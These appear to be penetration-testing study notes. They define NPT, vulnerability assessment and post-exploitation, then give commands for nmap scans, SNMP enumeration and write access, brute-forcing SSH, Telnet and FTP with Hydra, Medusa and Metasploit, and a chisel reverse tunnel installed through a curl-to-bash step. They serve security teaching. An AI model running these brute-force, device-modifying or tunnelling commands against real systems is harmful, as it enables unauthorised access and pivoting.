### **1. What is Network Penetration Testing?**

**Network Penetration Testing (NPT)** is the process of testing a computer network to identify security weaknesses by simulating real-world cyberattacks. It helps organizations discover vulnerabilities before attackers can exploit them.

**Key Points:**

* Simulates attacks on networks, systems, and devices.
* Identifies security flaws such as open ports, weak passwords, and misconfigurations.
* Evaluates the effectiveness of security controls like firewalls and intrusion detection systems.
* Helps improve the organization's overall security posture.
* Performed using tools such as Nmap, Metasploit, and Nessus.

**Conclusion:**
Network Penetration Testing helps organizations protect their networks by finding and fixing vulnerabilities before they are exploited by hackers.

---

### **2. What is Vulnerability Assessment?**

**Vulnerability Assessment (VA)** is the systematic process of identifying, analyzing, and prioritizing security vulnerabilities in computer systems, networks, and applications.

**Key Points:**

* Scans systems for known vulnerabilities.
* Identifies outdated software, weak configurations, and missing security patches.
* Assigns risk levels (Low, Medium, High, Critical) to vulnerabilities.
* Provides recommendations for remediation.
* Common tools include Nessus, OpenVAS, and Qualys.

**Conclusion:**
Vulnerability Assessment helps organizations proactively identify and fix security weaknesses before they can be exploited.

---

### **3. What is Post Exploitation?**

**Post Exploitation** is the phase of penetration testing that occurs after successfully gaining access to a target system. Its purpose is to assess the impact of a successful attack and determine what an attacker could do after compromising the system.

**Key Points:**

* Collects information about the compromised system.
* Escalates user privileges to gain administrative access.
* Maintains access using persistence techniques.
* Moves laterally to other systems within the network.
* Demonstrates the potential impact while avoiding damage to the system.

**Conclusion:**
Post Exploitation helps security professionals understand the extent of damage an attacker could cause and improve security defenses.

---

### **4. What are the Steps of Network Penetration Testing (NPT)?**

The Network Penetration Testing process generally consists of the following steps:

1. **Planning and Reconnaissance**

   * Define the scope and gather information about the target network.

2. **Scanning and Enumeration**

   * Identify live hosts, open ports, running services, and operating systems using scanning tools.

3. **Vulnerability Assessment**

   * Detect known vulnerabilities and security weaknesses in the target systems.

4. **Exploitation**

   * Attempt to exploit identified vulnerabilities to gain unauthorized access.

5. **Post Exploitation and Reporting**

   * Assess the impact, document findings, and provide recommendations to fix the vulnerabilities.

**Conclusion:**
Following these structured steps helps organizations identify and eliminate security weaknesses, thereby improving the overall security of their networks.

### **5.Scanning Definition?**
The methodical process of inspecting networks, devices, ports and applications to identify active systems, open ports and security vulnerabilities.

**5 Types of Nmap Scanning:**

i. Host Discovery:
```
nmap -sn <target_IP/CIDR>
```
ii. Port Scan:
```
nmap -Pn <target_IP>
```
iii.Service and Version Scanning:
```
nmap -sV <target_IP>
```
iv. OS Scan:
```
nmap -O <target_IP>
```
v. Script Scan:
```
nmap --script=<script_name>.nse -p<port_number> <target_IP>
```

**TCP Stealth Scan Types: (they all are used to detect if target has any port open with stealth)** 

i. FIN Scan: **Sends only FIN flag, closed ports reply with RST, open ports usually ignore it**. it **does not attempt to establish a full TCP connection** like a normal TCP connect scan. It can be useful for bypassing some older or poorly configured firewalls, although many modern systems and intrusion detection systems can detect or block it. Limitation: Many Windows systems do not follow the expected TCP behavior for FIN scans, making the results less reliable on those hosts.
```
nmap -sF <target_IP>
```
ii. NULL Scan: **Sends a TCP packet with no flags set, closed ports send RST, open ports typically give no response**. It may evade some older firewalls or packet filters, but modern firewalls and intrusion detection systems often detect or block it. Limitation: Like FIN scans, NULL scans are generally unreliable against many Windows systems because they do not follow the expected TCP behavior.
```
nmap -sN <target_IP>
```
iii. XMAS Scan: A TCP scanning method that **sends packets with the FIN, PSH, and URG flags to identify open and closed ports by analyzing the target's responses, Open port: Typically does not respond. Closed port: Responds with a TCP RST (Reset) packet.**. It is called an "XMAS" scan because the packet appears to have multiple flags "lit up," like a Christmas tree.
```
nmap -sX <target_IP>
```

### 6. SNMP Enumeration:

**Enumeration may tell us:**
Hostname, Users, Running Processes, Installed Software, Interfaces, Routing Table, System Name, Network Devices
```
nmap -sU -p 161 <target_IP> (Check if the SNMP service is running)
nmap -sV -p161-162 -sU <target_IP> (Detect the SNMP version and service)
nmap --script=snmp-info.nse <target_IP> (Gather basic SNMP information)
snmpwalk -v1 -c public <target_IP> (Enumerate everything using snmpwalk)
snmp-check -c Public <target_IP> (Try common community strings)
snmp-check -c private <target_IP> (Try common community strings)
nmap --script=snmp-brute.nse <IP> -p161 -sU (Brute-force the community string)
snmpset -v1 -c private 192.168.65.149 .1.3.6.1.2.1.1.5.0 s "r2" (Test write access, while Attempts to rename the device's hostname to r2.)
```
**Usage of Metasploit Framework to login on Agent:** 
```
search snmp login
use 4
set RHOSTS <target_IP>
set PASSWORD Public
Run
```

### 7. Simulating Brute-Force Attacks on SSH, Telnet, FTP:
**SSH Brute Forcing using nmap**:
```
nmap -p 22 --script=ssh-brute --script-args userdb=pass.txt,passdb=pass.txt <target_TP>
```

**SSH Brute Forcing using Medusa**:
```
medusa -h <target_IP> -U file.txt -P file.txt -M ssh
```

**Telnet Brute Forcing using Metasploit Framework**:
```
use auxiliary/scanner/telnet/telnet_login
Options
set RHOSTS <target_IP>
set USER_FILE pass.txt
set PASS_FILE pass.txt
set STOP_ON_SUCESS true
run
```

**FTP Brute Forcing using Hydra:**
```
hydra -L file.txt -P file.txt ftp:<target_IP>
```

### 8. HTTP tunneling using chisel tool:
Kali:
```
curl https://i.jpillora.com/chisel! | bash  (To install chisel)
chisel server --port 99 -reverse 
```
Windows:
```
Download chisel on windows extract and open powershell on the path
./chisel.exe
.\chisel.exe client <kali_IP>:99 R:3389:127.0.0.1:3389
```
Kali:
```
netstat -tlnp
```
